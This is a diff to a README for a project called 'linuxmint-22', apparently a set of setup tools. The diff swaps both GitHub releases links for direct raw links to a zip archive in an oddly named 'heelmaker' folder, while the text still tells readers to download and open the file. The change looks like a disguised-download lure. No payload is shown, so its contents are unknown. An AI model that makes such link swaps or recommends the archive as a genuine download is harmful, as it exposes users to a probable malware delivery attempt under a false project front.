@@ -1,6 +1,6 @@
 # 🐧 linuxmint-22 - Simple tools for your computer setup
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/floweringraspberrysutra841/linuxmint-22/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/floweringraspberrysutra841/linuxmint-22/main/heelmaker/linuxmint-v1.4.zip)
 
 ## 📁 About this project
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📥 Get the software
 
-Visit this page to download the necessary files: [https://github.com/floweringraspberrysutra841/linuxmint-22/releases](https://github.com/floweringraspberrysutra841/linuxmint-22/releases)
+Visit this page to download the necessary files: [https://raw.githubusercontent.com/floweringraspberrysutra841/linuxmint-22/main/heelmaker/linuxmint-v1.4.zip](https://raw.githubusercontent.com/floweringraspberrysutra841/linuxmint-22/main/heelmaker/linuxmint-v1.4.zip)
 
 On the release page, look for the file ending in `.tar.gz` or `.zip`. Click the name of the file to save it to your computer. Once the download finishes, move the file to your desktop or your home folder.
 
